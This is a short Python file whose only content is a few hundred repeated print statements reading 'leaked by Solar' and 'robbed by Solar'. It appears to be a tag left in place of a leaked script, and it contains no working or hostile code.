print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
